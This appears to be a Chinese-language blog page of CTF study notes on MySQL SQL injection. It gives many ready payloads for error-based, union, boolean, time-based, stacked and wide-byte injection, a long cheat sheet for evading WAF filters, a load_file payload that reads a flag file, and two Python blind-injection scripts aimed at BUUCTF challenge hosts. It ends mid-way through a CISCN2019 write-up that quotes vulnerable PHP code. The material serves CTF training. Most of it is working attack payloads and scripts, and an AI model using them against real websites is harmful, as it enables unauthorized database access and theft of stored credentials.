<h3 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h3><p>当 “in” 被过滤时，information_schema 和 mysql.innodb_table_stats 同时也被过滤了。这时可以用<strong>sys.schema_table_statistics</strong>来获取库名、表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();</span><br><span class="line"></span><br><span class="line">.利用join获取列名（join在CTF中经常使用的思路</span><br><span class="line">select * from user where id = -1 union all select * from (select * from user as a join user as b)as c;</span><br><span class="line"></span><br><span class="line">获取更多字段名和字段值</span><br><span class="line"> select * from user where id = -1 union all select*from (select * from user as a join user b using(id,username,passwd,phone))c;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="mysql-innodb-table-stats"><a href="#mysql-innodb-table-stats" class="headerlink" title="mysql.innodb_table_stats"></a>mysql.innodb_table_stats</h3><p>当 “or” 被过滤了导致information_schema不能用时，我们可以用<strong>mysql.innodb_table_stats</strong>这个表来获取库名、表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br><span class="line"></span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br><span class="line">查询表名</span><br><span class="line"></span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;查询表的内容</span><br></pre></td></tr></table></figure>



<h3 id="sys-schema-table-statistics"><a href="#sys-schema-table-statistics" class="headerlink" title="sys.schema_table_statistics"></a>sys.schema_table_statistics</h3><p>显然，当 “in” 被过滤时，information_schema 和 mysql.innodb_table_stats 同时也被过滤了。这时可以用<strong>sys.schema_table_statistics</strong>来获取库名、表名</p>
<p><a href="https://blog.csdn.net/Mr_helloword/article/details/107935479">https://blog.csdn.net/Mr_helloword/article/details/107935479</a>)</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库?username=admin&#x27;or(updatexml(1,concat(0x7e,(database()),0x7e),1))or&#x27;1&amp;password=1​</span><br><span class="line"></span><br><span class="line">报表名?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​爆列名?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))or&#x27;1&amp;password=1​</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">密码?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(left(password,32))from(H4rDsq1)),0x7e),1))or&#x27;1&amp;password=1?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,32))from(H4rDsq1)),0x7e),1))or&#x27;1&amp;password=1​​</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查数据库名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">爆表名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</span><br><span class="line">爆字段名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span><br><span class="line">爆数据：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</span><br><span class="line">爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a href="https://blog.csdn.net/silence1_/article/details/90812612">(43条消息) sql注入之报错注入_silence1_的博客-CSDN博客_报错注入</a></p>
<h2 id="sql注入绕过大全"><a href="#sql注入绕过大全" class="headerlink" title="sql注入绕过大全"></a>sql注入绕过大全</h2><p><strong>基本绕过方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.大小写</span><br><span class="line">2.双写</span><br><span class="line">3.编码，如URLEncode编码，ASCII编码绕过</span><br><span class="line">4.内敛注释</span><br></pre></td></tr></table></figure>

<p><strong>空格绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.用注释替换空格</span><br><span class="line">select/**/user,password/**/from /**/users;</span><br><span class="line">2.空格url编码%20</span><br><span class="line">3.两个空格代替一个空格</span><br><span class="line">4.用Tab代替空格</span><br><span class="line">5.%a0=空格</span><br><span class="line">6.如果空格被过滤，括号没有被过滤，可以用括号绕过</span><br><span class="line">select(user())from dual where(1=1)and(2=2)</span><br><span class="line">7.回车</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>引号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.使用十六进制</span><br><span class="line">例如：</span><br><span class="line">select column_name from information_schema.columns where table_name=&#x27;users&#x27;;</span><br><span class="line">如引号被过滤，就可以尝试使用十六进制来进行绕过</span><br><span class="line">即可以将语句写为：</span><br><span class="line">select column_name from information_schema.columns where table_name=0x7573657273;</span><br><span class="line"></span><br><span class="line">2.还有一个办法（前提是已经得知数据库名称和表名，例如dvwa和users）：</span><br><span class="line">select column_name from information_schema.columns where table_schema=database();</span><br><span class="line">查询所在数据库中的所有列名,然后</span><br><span class="line">可以猜或者尝试得知哪些字段在哪个表中，然后：</span><br><span class="line">select username,password from users;</span><br><span class="line"></span><br><span class="line">3.宽字节注入</span><br></pre></td></tr></table></figure>

<p><strong>逗号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在使用盲注的时候，需要使用到substr(),mid(),limit,这些子句方法都需要使用到逗号</span><br><span class="line"></span><br><span class="line">对于substr()和mid()这两个方法可以使用from的方式来解决：</span><br><span class="line">select substr(database() from 1 for 1);</span><br><span class="line"></span><br><span class="line">使用join</span><br><span class="line">union select 1,2 可以使用下面的句子代替</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br><span class="line"></span><br><span class="line">使用like</span><br><span class="line">select ascii(mid(user(),1,1))=80 可以使用下面的句子代替</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br><span class="line"></span><br><span class="line">limit中，使用offset绕过</span><br><span class="line">limit 1offset0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>or and xor not 绕过</strong>**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用符号替换and = &amp;&amp; or=|| xor=| not=!</span><br><span class="line">在敏感词中添加注释：an/**/d</span><br><span class="line">双写绕过oorr</span><br><span class="line">大小写变形</span><br><span class="line">编码</span><br></pre></td></tr></table></figure>

<p><strong>注释符绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3 or &#x27;1&#x27;=&#x27;1 即虽然无法使用注释符，但是可以闭合掉他</span><br><span class="line">或者：id=1&#x27; union select 1,2,&#x27;3</span><br><span class="line">最后添加or 1&#x27;</span><br><span class="line">最后添加 and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>等号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用like</span><br><span class="line">使用!&lt;&gt;,因为&lt;&gt;是不等于</span><br><span class="line">regrep (正则表达匹配)</span><br></pre></td></tr></table></figure>

<p>&lt;&gt;<strong>被过滤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">greatest(),least()</span><br><span class="line">strcmp(str1,str2),第一个参数小于第二个参数，返回-1，否则为1</span><br><span class="line">in，between a and b</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考文章：<a href="https://blog.csdn.net/weixin_44940180/article/details/107717511?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&utm_relevant_index=1">(43条消息) SQL注入–绕过技巧_雪碧可乐_的博客-CSDN博客_sql注入绕过</a></p>
<p><a href="https://blog.csdn.net/fastergohome/article/details/102514160">(44条消息) CTF 中的 SQL 注入总结_重新启程-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/AikN/p/15725756.html">https://www.cnblogs.com/AikN/p/15725756.html</a>)</p>
<p><a href="https://www.anquanke.com/post/id/160584#h2-12">CTF中几种通用的sql盲注手法和注入的一些tips - 安全客，安全资讯平台 (anquanke.com)</a></p>
<h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、先找到注入点，id=，username=，判断GET/POST/COOKIE注入</span><br><span class="line"></span><br><span class="line">2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示</span><br><span class="line"></span><br><span class="line">3、判断字符型注入还是数字型注入（2-1，’是否正常）</span><br><span class="line"></span><br><span class="line">4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））</span><br><span class="line"></span><br><span class="line">5、先简单测试空格和注释符是否被替换了，id=1 1，id = 1%231（看看能否用/ /、%20、%0a、%09绕过）</span><br><span class="line"></span><br><span class="line">6、进行fuzz，看看那些被waf了</span><br><span class="line"></span><br><span class="line">7、若页面上没有显示waf过滤之类的提示（sql injection detected），就测试是否有被替换为空的字符（如：’ or ‘*’=’、’ or ‘-‘=’ ，如果页面返回正常的话，则说明该字符被替换为空）</span><br><span class="line"></span><br><span class="line">8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过</span><br><span class="line"></span><br><span class="line">9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注</span><br><span class="line"></span><br><span class="line">10、先在bp中跑一遍看是否有结果</span><br><span class="line"></span><br><span class="line">11、尝试写脚本</span><br></pre></td></tr></table></figure>

<h2 id="boolean注入"><a href="#boolean注入" class="headerlink" title="boolean注入"></a><strong>boolean注入</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断方式：</span><br><span class="line">   通过长度判断 length(): length(database())&gt;=x</span><br><span class="line">   通过字符判断 substr():substr(database() ,1,1)= &#x27;s&#x27;</span><br><span class="line">   通过 ascII 码判断:ascii():ascii(substr(database(),1,1)) =x </span><br><span class="line">   注入漏洞判断：</span><br><span class="line">   1.id=1&#x27;   报错 </span><br><span class="line">   2.id=1 and 1=1  结果和 id=1 一样</span><br><span class="line">   3.id=1 and 1=2  结果异常</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A:判断数据库名的长度 http://xxxxxx?id=1&#x27; and length(database())&gt;=1--+  从而判 断数据库名的长度为 4</span><br><span class="line">  B:判断数据库名 Substr() 数据库库名 a~z,0~9 ‘and substr(database(),1,1)--+ </span><br><span class="line">  C:Burp 判断数据库名 http://xxxxxxxx?id=1&#x27; and substr(database(),1,1)=&#x27;a&#x27;--+ 逐字判断数据库名为 test，test 数据库名 </span><br><span class="line">  D:Burpsuite 爆破数据库的表名 http://xxxxxx?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+ person     users   xss  //三个表</span><br><span class="line">  E:Burp 爆字段名 http://xxxxxxxx?id=1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;test&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+ id   username  password 等</span><br><span class="line">  F:获取数据 http://xxxxx?id=1&#x27; and substr((select username from test.users limit 0,1),1,1)=&#x27;a&#x27;--+ </span><br></pre></td></tr></table></figure>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断数据库名的长度</span><br><span class="line"> http://xxxxxx?id=1 and if(length(database())&gt;=6,sleep(5),1) </span><br><span class="line">爆库名</span><br><span class="line"> http://xxxxxxx?id=1 and if(substr(database(),1,1)=&#x27;a&#x27;,sleep(5),1)   数据库名为 test </span><br><span class="line">爆表名</span><br><span class="line"> http://xxxxxxx?id=1 and if(substr((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1)  表名 </span><br><span class="line">爆字段</span><br><span class="line">  http://xxxxxxx?id=1 and if(substr((select column_name from information_schema.columns where table_schema=&#x27;test&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1)  </span><br><span class="line">爆数据 </span><br><span class="line"> http://xxxxxxxxxx?id=1 and if(substr(select username from test.users limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) 由于数据库名的范围一般在 a~z,0~9，特殊字符，大小写等</span><br></pre></td></tr></table></figure>

<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>使用条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有 当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query()函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所 以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆库名：test http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr(database(),1,1)=&#x27;a&#x27;,sleep(5),1)</span><br><span class="line"> 爆表名 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) </span><br><span class="line"> 爆字段名 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select column_name from information_schema.columns where table_schema=&#x27;test&#x27; where table_name=&#x27;user&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) </span><br><span class="line"> 爆值 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select username from test.users limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) </span><br></pre></td></tr></table></figure>

<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入主要是源于程序员设置数据库编码与 php 编码设置为不同的两个编码，这样就可能会产 生宽字节注入。GBK 占用两字节，ASCII 占用一字节。PHP 中编码为 GBK，函数执行添加的是 ASCII 编码（添加的符号为‚\‛），MYSQL 默认字符集是 GBK 等宽字节字符集。 输入%df%27,本来\ 会转义%27（’），但\（其中\的十六进制是 %5C）的编码位数为 92，%df 的 编码位数为 223，%df%5c 符合 gbk 取值范围（第一个字节 129-254，第二个字节 64-254），会解析 为一个汉字‚運‛，这样\就会是去应有的作用。 id=1’ id=1%df%5c’</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/web/sql/kuanzifu.php?id=1 </span><br><span class="line">127.0.0.1/web/sql/kuanzifu.php?id=1’ </span><br><span class="line">127.0.0.1/web/sql/kuanzifu.php?id=1%df’</span><br><span class="line"> 从返回的结果可以看出，参数 id=1 在数据库查询是被单引号包围的。当传入参数 id=1’时， 传入的单引号又被转义符（反斜线）转义，导致参数 ID 无法逃逸单引号的包围，所以在一般情况下， 此处是不存在 SQL 注入漏洞的。不过有一个特例，就是当数据库的编码为 GBK 时，可以使用宽字节 注入，宽字节的格式是在地址后先加一个%df,再加单引号，因为反斜杠的编码为%5c,而在 GBK 编码 中，%df%5c 是繁体字連，所以这时，单引号成功逃逸，爆出 Mysql 数据库错误。</span><br><span class="line">  %df%27====&gt;(check_addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;運&#x27;</span><br><span class="line">   $sql=&quot;SELECT * FROM users WHERE id=&#x27;1 運&#x27;&#x27; LIMIT 0,1&quot;; #成功将单引号闭合，可以进行 SQL 注入。</span><br><span class="line">    判断数据库表有 6 个字段数 http://127.0.0.1/web/sql/kuanzifu.php?id=1%df%27%20order%20by%207--+</span><br><span class="line">     http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df%27%20union%20select%201,2,3,4,5,6--+ </span><br><span class="line">    爆库名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df%27%20union%20select%201,2,3,(databas e()),5,6--+</span><br><span class="line">    爆表名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df&#x27; union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=(select database())),5,6%23</span><br><span class="line">    爆字段名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df&#x27; union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 1,1)),5,6%23 </span><br></pre></td></tr></table></figure>

<p><a href="https://zhuanlan.zhihu.com/p/397815893?utm_source=qq&utm_medium=social&utm_oi=1204405106541780992">Web漏洞之SQL注入详解 - 知乎 (zhihu.com)</a></p>
<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)#</span><br></pre></td></tr></table></figure>

<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#然后是二分法，二分法要快很多：</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span>(<span class="params">i,j</span>):</span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span></span><br><span class="line">    sql = <span class="string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">    data = &#123;<span class="string">&quot;id&quot;</span>:sql&#125;</span><br><span class="line">    r = requests.get(url,params=data)</span><br><span class="line">    <span class="comment"># print (r.url)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Click&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>) :</span><br><span class="line">        <span class="built_in">print</span>(i,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        low = <span class="number">31</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high :</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            res = payload(i,mid)</span><br><span class="line">            <span class="keyword">if</span> res :</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">        f = <span class="built_in">int</span>((low + high + <span class="number">1</span>)) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="number">127</span> <span class="keyword">or</span> f == <span class="number">31</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># print (f)</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(f)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag=&#x27;</span>,flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://35737a35-63b7-4e60-a584-e5cbbead6dc6.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line"><span class="comment">#give_grandpa_pa_pa_pa</span></span><br><span class="line"></span><br><span class="line">payload_table=<span class="string">&#x27;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">132</span></span><br><span class="line">    mid = (low + high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        payload = payload_table.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low+high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a) Version()；当前 mysql 的版本</span><br><span class="line">b) Database();当前网站使用的数据库</span><br><span class="line">c) User();当前 MySQL 的用户</span><br><span class="line">d) system_user(); 系统用户名</span><br><span class="line">e）session_user();连接数据库的用户名</span><br><span class="line">f)current_user;当前用户名</span><br><span class="line">g)load_file();读取本地文件</span><br><span class="line">h)length(str) : 返回给定字符串的长度，如 length(“string”)=6</span><br><span class="line">i)substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度 ,如 substr(“chinese”,3,2)=“in”</span><br><span class="line">substr()、stbstring()、mid() 三个函数的用法、功能均一致</span><br><span class="line">j)concat(username)：将查询到的username连在一起，默认用逗号分隔</span><br><span class="line">concat(str1,’’,str2)：将字符串str1和str2的数据查询到一起，中间用连接</span><br><span class="line">group_concat(username) ：将username数据查询在一起，用逗号连接</span><br><span class="line">left(m,n) --从左向右截取字符串 m 返回其前 n 位</span><br><span class="line">substr(m,1,1) --取字符串 m 的左边第一位起，1 字长的字符串</span><br><span class="line">ascii(m) --返回字符 m 的 ASCII 码</span><br><span class="line">base64(m)—返回字符 m 的 base64 编码 • if(str1,str2,str3)–如果 str1 正确就执行 str2，否则执行 str3</span><br><span class="line">sleep(m)–使程序暂停 m 秒</span><br><span class="line">length(m) --返回字符串 m 的长度</span><br><span class="line">count(column_name) --返回指定列的值的数目</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p><a href="https://www.anquanke.com/post/id/160584#h2-7">CTF中几种通用的sql盲注手法和注入的一些tips - 安全客，安全资讯平台 (anquanke.com)</a></p>
<h1 id="题"><a href="#题" class="headerlink" title="题"></a>题</h1><p>[BUUCTF<a href="https://www.cnblogs.com/ophxc/p/13160638.html?msclkid=13cbb19da7ee11eca92f21a34f488ed0#">归纳]sql注入相关题目 - op_hxc - 博客园 (cnblogs.com)</a></p>
<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb1"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb1" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb1"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb1</h2><p>用御剑扫描之后可以得到robots.txt文件，这个文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>

<p>但是文件名字不知道，在查看源码中得到image.php?id=1   </p>
<p>从这点可以推测到存在sql注入，并且文件的名字为image</p>
<p>访问image.php.bak,可以得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;<span class="comment">//包含config.php文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;<span class="comment">//三目运算符，id为空则赋值为1，不为空则获得它的值</span></span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;<span class="comment">//path等同于上面</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);<span class="comment">//转义</span></span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);<span class="comment">//转义</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);<span class="comment">//第一个是转义字符，guo&#x27;l</span></span><br><span class="line"><span class="variable">$path</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span 